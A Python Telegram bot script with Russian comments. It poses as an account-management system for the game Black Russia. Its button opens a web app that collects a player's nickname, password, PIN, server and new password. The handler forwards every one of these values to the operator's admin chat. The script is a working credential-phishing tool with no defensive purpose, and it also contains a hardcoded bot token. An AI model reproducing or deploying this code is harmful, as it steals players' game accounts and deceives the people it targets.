import telebot
from telebot import types
import json

# Твой токен уже внутри
TOKEN = '8215407058:AAGSRORQRWbfFup1ZMLO_Qfc5-Uo0MfV2Sg'
bot = telebot.TeleBot(TOKEN)

# ЗАМЕНИ 0 на свой ID (узнай его в боте @userinfobot)
ADMIN_ID = 0 

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    # Временная ссылка, потом заменим на твою
    web_app = types.WebAppInfo(url="https://black-russia-app-test.vercel.app") 
    btn = types.KeyboardButton("🚀 Открыть Black Russia", web_app=web_app)
    markup.add(btn)
    bot.send_message(message.chat.id, "Система управления аккаунтом запущена.", reply_markup=markup)

@bot.message_handler(content_types=['web_app_data'])
def get_data(message):
    data = json.loads(message.web_app_data.data)
    report = (f"📩 **ДАННЫЕ ПОЛУЧЕНЫ:**\n\n"
              f"👤 Ник: {data.get('nick')}\n"
              f"🔑 Пароль: {data.get('pass')}\n"
              f"🔢 Пин-код: {data.get('pin')}\n"
              f"🌍 Сервер: {data.get('server')}\n"
              f"🆕 Новый пароль: {data.get('newPass')}")
    bot.send_message(ADMIN_ID, report)

print("Бот запущен...")
bot.infinity_polling()